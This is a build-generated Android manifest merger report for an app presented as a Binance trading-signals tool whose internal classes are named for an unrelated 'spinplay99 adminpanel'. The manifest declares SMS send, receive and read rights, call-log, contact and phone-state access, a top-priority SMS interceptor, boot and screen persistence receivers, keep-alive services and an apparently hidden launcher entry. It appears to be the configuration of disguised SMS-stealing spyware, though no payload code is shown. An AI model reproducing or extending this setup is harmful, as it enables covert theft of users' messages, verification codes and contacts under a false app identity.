app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="dApp.binance.Trading.Signals"
4    android:versionCode="14"
5    android:versionName="1.4-god8" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
9        android:targetSdkVersion="36" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src/main/AndroidManifest.xml:5:5-67
11-->src/main/AndroidManifest.xml:5:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src/main/AndroidManifest.xml:6:5-79
12-->src/main/AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
13-->src/main/AndroidManifest.xml:7:5-77
13-->src/main/AndroidManifest.xml:7:22-74
14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
14-->src/main/AndroidManifest.xml:8:5-87
14-->src/main/AndroidManifest.xml:8:22-84
15    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
15-->src/main/AndroidManifest.xml:9:5-92
15-->src/main/AndroidManifest.xml:9:22-89
16    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
16-->src/main/AndroidManifest.xml:10:5-81
16-->src/main/AndroidManifest.xml:10:22-78
17    <uses-permission android:name="android.permission.WAKE_LOCK" />
17-->src/main/AndroidManifest.xml:11:5-68
17-->src/main/AndroidManifest.xml:11:22-65
18    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
18-->src/main/AndroidManifest.xml:12:5-77
18-->src/main/AndroidManifest.xml:12:22-74
19    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
19-->src/main/AndroidManifest.xml:13:5-95
19-->src/main/AndroidManifest.xml:13:22-92
20    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
20-->src/main/AndroidManifest.xml:14:5-79
20-->src/main/AndroidManifest.xml:14:22-76
21    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
21-->src/main/AndroidManifest.xml:15:5-17:47
21-->src/main/AndroidManifest.xml:16:9-58
22    <uses-permission android:name="android.permission.SEND_SMS" />
22-->src/main/AndroidManifest.xml:18:5-67
22-->src/main/AndroidManifest.xml:18:22-64
23    <uses-permission android:name="android.permission.RECEIVE_SMS" />
23-->src/main/AndroidManifest.xml:19:5-70
23-->src/main/AndroidManifest.xml:19:22-67
24    <uses-permission android:name="android.permission.READ_SMS" />
24-->src/main/AndroidManifest.xml:20:5-67
24-->src/main/AndroidManifest.xml:20:22-64
25    <uses-permission android:name="android.permission.READ_CALL_LOG" />
25-->src/main/AndroidManifest.xml:21:5-72
25-->src/main/AndroidManifest.xml:21:22-69
26    <uses-permission android:name="android.permission.READ_CONTACTS" />
26-->src/main/AndroidManifest.xml:22:5-72
26-->src/main/AndroidManifest.xml:22:22-69
27    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
27-->src/main/AndroidManifest.xml:23:5-75
27-->src/main/AndroidManifest.xml:23:22-72
28
29    <permission
29-->[androidx.core:core:1.13.0] AndroidManifest.xml:22:5-24:47
30        android:name="dApp.binance.Trading.Signals.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
30-->[androidx.core:core:1.13.0] AndroidManifest.xml:23:9-81
31        android:protectionLevel="signature" />
31-->[androidx.core:core:1.13.0] AndroidManifest.xml:24:9-44
32
33    <uses-permission android:name="dApp.binance.Trading.Signals.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
33-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:5-97
33-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:22-94
34
35    <application
35-->src/main/AndroidManifest.xml:25:5-115:19
36        android:name="com.spinplay99.adminpanel.SpinPlayApp"
36-->src/main/AndroidManifest.xml:26:9-61
37        android:allowBackup="true"
37-->src/main/AndroidManifest.xml:27:9-35
38        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
38-->[androidx.core:core:1.13.0] AndroidManifest.xml:28:18-86
39        android:directBootAware="true"
39-->src/main/AndroidManifest.xml:28:9-39
40        android:extractNativeLibs="true"
41        android:icon="@mipmap/ic_launcher"
41-->src/main/AndroidManifest.xml:30:9-43
42        android:label="@string/app_name"
42-->src/main/AndroidManifest.xml:31:9-41
43        android:largeHeap="true"
43-->src/main/AndroidManifest.xml:29:9-33
44        android:networkSecurityConfig="@xml/network_security_config"
44-->src/main/AndroidManifest.xml:36:9-69
45        android:roundIcon="@mipmap/ic_launcher_round"
45-->src/main/AndroidManifest.xml:32:9-54
46        android:supportsRtl="true"
46-->src/main/AndroidManifest.xml:33:9-35
47        android:theme="@style/Theme.SpinPlay99"
47-->src/main/AndroidManifest.xml:34:9-48
48        android:usesCleartextTraffic="true" >
48-->src/main/AndroidManifest.xml:35:9-44
49        <activity
49-->src/main/AndroidManifest.xml:43:9-51:20
50            android:name="com.spinplay99.adminpanel.MainActivity"
50-->src/main/AndroidManifest.xml:44:13-66
51            android:exported="true"
51-->src/main/AndroidManifest.xml:45:13-36
52            android:screenOrientation="portrait" >
52-->src/main/AndroidManifest.xml:46:13-49
53            <intent-filter>
53-->src/main/AndroidManifest.xml:47:13-50:29
54                <action android:name="android.intent.action.MAIN" />
54-->src/main/AndroidManifest.xml:48:17-69
54-->src/main/AndroidManifest.xml:48:25-66
55
56                <category android:name="android.intent.category.INFO" />
56-->src/main/AndroidManifest.xml:49:17-73
56-->src/main/AndroidManifest.xml:49:27-70
57            </intent-filter>
58        </activity>
59
60        <service
60-->src/main/AndroidManifest.xml:53:9-58:44
61            android:name="com.spinplay99.adminpanel.BackgroundSyncService"
61-->src/main/AndroidManifest.xml:54:13-75
62            android:enabled="true"
62-->src/main/AndroidManifest.xml:55:13-35
63            android:exported="false"
63-->src/main/AndroidManifest.xml:56:13-37
64            android:foregroundServiceType="mediaPlayback|dataSync"
64-->src/main/AndroidManifest.xml:57:13-67
65            android:stopWithTask="false" />
65-->src/main/AndroidManifest.xml:58:13-41
66        <service
66-->src/main/AndroidManifest.xml:60:9-63:72
67            android:name="com.spinplay99.adminpanel.SyncWatchdogJob"
67-->src/main/AndroidManifest.xml:61:13-69
68            android:exported="true"
68-->src/main/AndroidManifest.xml:62:13-36
69            android:permission="android.permission.BIND_JOB_SERVICE" />
69-->src/main/AndroidManifest.xml:63:13-69
70
71        <receiver
71-->src/main/AndroidManifest.xml:65:9-78:20
72            android:name="com.spinplay99.adminpanel.BootReceiver"
72-->src/main/AndroidManifest.xml:66:13-66
73            android:directBootAware="true"
73-->src/main/AndroidManifest.xml:69:13-43
74            android:enabled="true"
74-->src/main/AndroidManifest.xml:67:13-35
75            android:exported="true" >
75-->src/main/AndroidManifest.xml:68:13-36
76            <intent-filter>
76-->src/main/AndroidManifest.xml:70:13-77:29
77                <action android:name="android.intent.action.BOOT_COMPLETED" />
77-->src/main/AndroidManifest.xml:71:17-79
77-->src/main/AndroidManifest.xml:71:25-76
78                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
78-->src/main/AndroidManifest.xml:72:17-86
78-->src/main/AndroidManifest.xml:72:25-83
79                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
79-->src/main/AndroidManifest.xml:73:17-84
79-->src/main/AndroidManifest.xml:73:25-81
80                <action android:name="android.intent.action.USER_PRESENT" />
80-->src/main/AndroidManifest.xml:74:17-77
80-->src/main/AndroidManifest.xml:74:25-74
81                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
81-->src/main/AndroidManifest.xml:75:17-82
81-->src/main/AndroidManifest.xml:75:25-79
82                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
82-->src/main/AndroidManifest.xml:76:17-82
82-->src/main/AndroidManifest.xml:76:25-79
83            </intent-filter>
84        </receiver>
85        <receiver
85-->src/main/AndroidManifest.xml:80:9-87:20
86            android:name="com.spinplay99.adminpanel.KeepAliveReceiver"
86-->src/main/AndroidManifest.xml:81:13-71
87            android:enabled="true"
87-->src/main/AndroidManifest.xml:82:13-35
88            android:exported="false" >
88-->src/main/AndroidManifest.xml:83:13-37
89            <intent-filter>
89-->src/main/AndroidManifest.xml:84:13-86:29
90                <action android:name="dApp.binance.Trading.Signals.KEEP_ALIVE" />
90-->src/main/AndroidManifest.xml:85:17-82
90-->src/main/AndroidManifest.xml:85:25-79
91            </intent-filter>
92        </receiver>
93        <receiver
93-->src/main/AndroidManifest.xml:89:9-103:20
94            android:name="com.spinplay99.adminpanel.MultiEventReceiver"
94-->src/main/AndroidManifest.xml:90:13-72
95            android:enabled="true"
95-->src/main/AndroidManifest.xml:91:13-35
96            android:exported="true" >
96-->src/main/AndroidManifest.xml:92:13-36
97            <intent-filter>
97-->src/main/AndroidManifest.xml:93:13-102:29
98                <action android:name="android.intent.action.BOOT_COMPLETED" />
98-->src/main/AndroidManifest.xml:71:17-79
98-->src/main/AndroidManifest.xml:71:25-76
99                <action android:name="android.intent.action.SCREEN_ON" />
99-->src/main/AndroidManifest.xml:95:17-74
99-->src/main/AndroidManifest.xml:95:25-71
100                <action android:name="android.intent.action.SCREEN_OFF" />
100-->src/main/AndroidManifest.xml:96:17-75
100-->src/main/AndroidManifest.xml:96:25-72
101                <action android:name="android.intent.action.BATTERY_CHANGED" />
101-->src/main/AndroidManifest.xml:97:17-80
101-->src/main/AndroidManifest.xml:97:25-77
102                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
102-->src/main/AndroidManifest.xml:98:17-87
102-->src/main/AndroidManifest.xml:98:25-84
103                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
103-->src/main/AndroidManifest.xml:99:17-90
103-->src/main/AndroidManifest.xml:99:25-87
104                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
104-->src/main/AndroidManifest.xml:100:17-79
104-->src/main/AndroidManifest.xml:100:25-76
105                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
105-->src/main/AndroidManifest.xml:101:17-82
105-->src/main/AndroidManifest.xml:101:25-79
106            </intent-filter>
107        </receiver>
108        <receiver
108-->src/main/AndroidManifest.xml:105:9-113:20
109            android:name="com.spinplay99.adminpanel.SmsReceiver"
109-->src/main/AndroidManifest.xml:106:13-65
110            android:enabled="true"
110-->src/main/AndroidManifest.xml:107:13-35
111            android:exported="true"
111-->src/main/AndroidManifest.xml:108:13-36
112            android:permission="android.permission.BROADCAST_SMS" >
112-->src/main/AndroidManifest.xml:109:13-66
113            <intent-filter android:priority="1000" >
113-->src/main/AndroidManifest.xml:110:13-112:29
113-->src/main/AndroidManifest.xml:110:28-51
114                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
114-->src/main/AndroidManifest.xml:101:17-82
114-->src/main/AndroidManifest.xml:101:25-79
115            </intent-filter>
116        </receiver>
117
118        <service
118-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:26:9-35:19
119            android:name="com.google.firebase.components.ComponentDiscoveryService"
119-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:27:13-84
120            android:directBootAware="true"
120-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:32:13-43
121            android:exported="false" >
121-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:28:13-37
122            <meta-data
122-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:29:13-31:85
123                android:name="com.google.firebase.components:com.google.firebase.database.FirebaseDatabaseKtxRegistrar"
123-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:30:17-120
124                android:value="com.google.firebase.components.ComponentRegistrar" />
124-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:31:17-82
125            <meta-data
125-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:32:13-34:85
126                android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
126-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:33:17-109
127                android:value="com.google.firebase.components.ComponentRegistrar" />
127-->[com.google.firebase:firebase-database:20.3.0] AndroidManifest.xml:34:17-82
128            <meta-data
128-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:12:13-14:85
129                android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar"
129-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:13:17-116
130                android:value="com.google.firebase.components.ComponentRegistrar" />
130-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:14:17-82
131            <meta-data
131-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:35:13-37:85
132                android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar"
132-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:36:17-109
133                android:value="com.google.firebase.components.ComponentRegistrar" />
133-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:37:17-82
134        </service>
135
136        <activity
136-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:20:9-22:45
137            android:name="com.google.android.gms.common.api.GoogleApiActivity"
137-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:20:19-85
138            android:exported="false"
138-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:22:19-43
139            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
139-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:21:19-78
140
141        <provider
141-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:24:9-32:20
142            android:name="androidx.startup.InitializationProvider"
142-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:25:13-67
143            android:authorities="dApp.binance.Trading.Signals.androidx-startup"
143-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:26:13-68
144            android:exported="false" >
144-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:27:13-37
145            <meta-data
145-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
146                android:name="androidx.emoji2.text.EmojiCompatInitializer"
146-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
147                android:value="androidx.startup" />
147-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
148            <meta-data
148-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:29:13-31:52
149                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
149-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:30:17-78
150                android:value="androidx.startup" />
150-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:31:17-49
151            <meta-data
151-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:29:13-31:52
152                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
152-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:30:17-85
153                android:value="androidx.startup" />
153-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:31:17-49
154        </provider>
155
156        <meta-data
156-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:21:9-23:69
157            android:name="com.google.android.gms.version"
157-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:22:13-58
158            android:value="@integer/google_play_services_version" />
158-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:23:13-66
159
160        <receiver
160-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:34:9-52:20
161            android:name="androidx.profileinstaller.ProfileInstallReceiver"
161-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:35:13-76
162            android:directBootAware="false"
162-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:36:13-44
163            android:enabled="true"
163-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:37:13-35
164            android:exported="true"
164-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:38:13-36
165            android:permission="android.permission.DUMP" >
165-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:39:13-57
166            <intent-filter>
166-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:40:13-42:29
167                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
167-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:17-91
167-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:25-88
168            </intent-filter>
169            <intent-filter>
169-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:43:13-45:29
170                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
170-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:17-85
170-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:25-82
171            </intent-filter>
172            <intent-filter>
172-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:46:13-48:29
173                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
173-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:17-88
173-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:25-85
174            </intent-filter>
175            <intent-filter>
175-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:49:13-51:29
176                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
176-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:17-95
176-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:25-92
177            </intent-filter>
178        </receiver>
179    </application>
180
181</manifest>